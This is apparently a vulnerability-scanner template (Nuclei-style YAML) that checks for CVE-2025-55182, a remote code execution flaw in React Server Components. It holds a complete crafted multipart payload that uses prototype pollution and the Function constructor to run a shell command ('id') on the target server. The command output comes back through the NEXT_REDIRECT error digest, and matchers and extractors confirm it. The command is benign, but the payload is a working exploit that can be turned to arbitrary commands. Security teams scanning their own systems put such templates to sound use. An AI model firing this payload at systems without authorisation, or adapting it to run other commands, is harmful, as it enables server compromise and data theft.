id: react2shell-cve-2025-55182-rce-safe-check

info:
  name: React2Shell RCE via React Server Components (CVE-2025-55182)
  author: hxorz
  severity: high
description: |
  Actively verifies the exploitability of CVE-2025-55182 by triggering a
  controlled server-side command execution (`id`) through a crafted React
  Server Components (RSC) payload.

  Successful exploitation is confirmed by extracting the command output from
  the server-generated NEXT_REDIRECT error digest in the HTTP response.

  reference:
    - https://github.com/msanft/CVE-2025-55182
    - https://github.com/subzer0x0/React2Shell
  classification:
    cve-id: CVE-2025-55182
  tags: rce,react,nextjs,rsc,react2shell,cve

http:
  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      User-Agent: "Mozilla/5.0"
      Accept: "*/*"
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
      Next-Action: "x"

    body: |
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="0"

      {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
          "_prefix": "var out=process.mainModule.require('child_process').execSync('id',{'timeout':3000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:out});",
          "_chunks": "$Q2",
          "_formData": {
            "get": "$1:constructor:constructor"
          }
        }
      }
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="1"

      "$@0"
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="2"

      []
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

    matchers-condition: and

    matchers:
      - type: status
        status:
          - 500

      - type: word
        part: header
        words:
          - "text/x-component"

      - type: regex
        part: body
        regex:
          - '"digest":"uid=.*?gid=.*?groups=.*?"'

    extractors:
      - type: regex
        part: body
        name: command-output
        group: 1
        regex:
          - '"digest":"(uid=.*?gid=.*?groups=.*?)"'

